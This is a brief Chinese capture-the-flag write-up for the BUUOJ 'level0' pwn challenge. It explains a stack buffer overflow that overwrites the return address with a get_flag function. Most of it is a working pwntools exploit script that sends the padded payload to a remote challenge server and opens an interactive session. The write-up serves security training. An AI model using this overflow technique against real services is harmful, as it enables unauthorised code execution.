这道题就是一个很基础的pwn，溢出之后直接覆盖返回地址为get_flag的地址就可以

```python
from pwn import *

#io = process('./level0')
io = remote('node3.buuoj.cn',28376)

payload = 'a'*0x80 + 'b'*8 + p64(0x400596)

io.recvline()
io.sendline(payload)

io.interactive()
```

